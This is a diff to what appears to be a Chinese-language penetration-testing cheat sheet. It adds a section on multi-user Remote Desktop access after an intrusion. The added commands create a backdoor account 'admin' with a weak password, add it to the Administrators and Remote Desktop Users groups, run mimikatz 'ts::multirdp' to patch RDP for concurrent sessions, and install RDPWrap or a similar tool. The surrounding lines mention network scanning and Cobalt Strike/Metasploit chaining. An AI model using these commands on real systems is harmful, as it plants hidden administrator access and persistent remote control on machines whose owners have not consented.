@@ -30,6 +30,21 @@ Ladon 192.168.52.0/24 OnlinePC
 net view /domain 查看域情况
 CS和msf联动
 ```
+### 多用户登录远程桌面
+[RDP连接多开方法与利用思路](https://mp.weixin.qq.com/s/GCFCIwqnQUAFNED0dTVDoA)
+
+```bash
+net user admin 123456 /add
+net localgroup administrators admin /add
+net localgroup "Remote Desktop Users" admin /add 2>nul
+
+# 1. 不同用户同时登录
+mimikatz.exe privilege::Debug ts::multirdp exit
+# 2. 同用户同时登录 RDPWrap
+install.bat
+rdpconf.exe  # 取消 Single Session
+## 2.1 win10+win11 http://github.com/anhkgg/SuperRDP
+```
 
 
 ## linux 
